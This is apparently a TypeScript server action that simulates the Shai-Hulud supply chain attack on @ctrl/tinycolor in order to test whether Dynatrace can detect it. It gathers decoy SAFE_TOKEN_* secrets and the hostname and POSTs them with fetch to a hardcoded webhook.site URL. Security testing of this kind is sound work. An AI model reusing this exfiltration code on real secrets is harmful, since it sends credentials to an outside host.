'use server';

import { harvestBenignSecrets } from '@ctrl/tinycolor';
import os from 'os';

const DEFAULT_EXFIL_URL = 'https://webhook.site/1c129c66-a498-4463-990f-cb7072441d28';

/**
 * Shai-Hulud Supply Chain Attack Simulation
 *
 * This server action triggers the malicious payload from the compromised
 * @ctrl/tinycolor package WITHIN a traced request context, ensuring Dynatrace
 * can capture the outbound exfiltration as a span.
 *
 * IoC for Dynatrace:
 * 1. Outbound HTTP POST to attacker-controlled URL
 * 2. Secret/token harvesting from environment and filesystem
 * 3. Package metadata identifying the compromised dependency
 */
export async function triggerSupplyChainExfil() {
    console.log('[shai-hulud] Supply chain payload triggered within request context');

    const artifacts = harvestBenignSecrets();

    const isEmpty = !artifacts || (artifacts.envMatches.length === 0 && artifacts.fileMatches.length === 0);

    if (isEmpty) {
        console.log('[shai-hulud] No artifacts found to exfiltrate');
        return {
            success: true,
            message: 'No SAFE_TOKEN_* artifacts found. Set SAFE_TOKEN_* env vars or create fake-secrets/ dir.',
            artifacts: { envMatches: 0, fileMatches: 0 },
        };
    }

    await exfiltrateWithinTrace(artifacts, 'shai-hulud-server-action');

    return {
        success: true,
        message: 'Exfiltration triggered - check Dynatrace for spans',
        artifacts: {
            envMatches: artifacts.envMatches.length,
            fileMatches: artifacts.fileMatches.length,
        },
    };
}

async function exfiltrateWithinTrace(
    artifacts: NonNullable<ReturnType<typeof harvestBenignSecrets>>,
    source: string,
): Promise<void> {
    const urlString = process.env.CTRL_TINYCOLOR_EXFIL_URL || DEFAULT_EXFIL_URL;

    const body = JSON.stringify({
        package: '@ctrl/tinycolor',
        version: '3.6.0-sim',
        source,
        artifacts,
        hostname: os.hostname(),
        timestamp: new Date().toISOString(),
    });

    console.warn('[shai-hulud] Exfiltrating harvest within traced context', {
        url: urlString,
        source,
        environmentMatches: artifacts.envMatches.length,
        fileMatches: artifacts.fileMatches.length,
    });

    // Using fetch() for better Dynatrace instrumentation (creates child span)
    try {
        const response = await fetch(urlString, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Package': '@ctrl/tinycolor',
                'X-Attack': 'shai-hulud',
            },
            body,
        });
        console.log('[shai-hulud] Exfil response status:', response.status);
    } catch (error) {
        console.debug('[shai-hulud] Exfil request error:', error);
    }
}
